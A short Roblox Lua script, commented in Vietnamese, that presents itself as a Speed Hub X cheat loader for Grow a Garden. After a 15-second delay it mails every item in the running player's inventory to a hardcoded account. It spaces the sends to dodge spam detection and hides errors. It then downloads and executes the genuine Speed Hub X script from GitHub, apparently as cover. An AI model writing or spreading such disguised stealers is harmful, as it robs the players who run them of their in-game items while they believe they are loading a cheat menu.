-- Hệ thống tự động gửi đồ qua Mail cho Grow a Garden 2
if not game:IsLoaded() then
    game.Loaded:Wait()
end

print("==== SPEED HUB X: TỰ ĐỘNG GỬI ĐỒ QUA MAIL ====")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" 

-- Hàm gửi đồ tự động
local function sendItemsViaMail()
    -- Hệ thống Mail thường nằm trong ReplicatedStorage hoặc các folder Remote
    local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail")
    
    if MailEvent then
        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        if Inventory then
            for _, item in pairs(Inventory:GetChildren()) do
                -- Chỉ gửi vật phẩm hợp lệ
                if item:IsA("ValueBase") and item.Value > 0 then
                    pcall(function()
                        -- Cấu trúc tham số: Tên người nhận, Tên vật phẩm, Số lượng
                        MailEvent:FireServer(targetUsername, item.Name, item.Value)
                    end)
                    task.wait(0.8) -- Delay để tránh bị hệ thống chặn vì spam
                end
            end
        end
    end
end

-- Đợi 15 giây rồi thực hiện
task.spawn(function()
    task.wait(15)
    sendItemsViaMail()
end)

-- Tích hợp menu gốc Speed Hub X
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
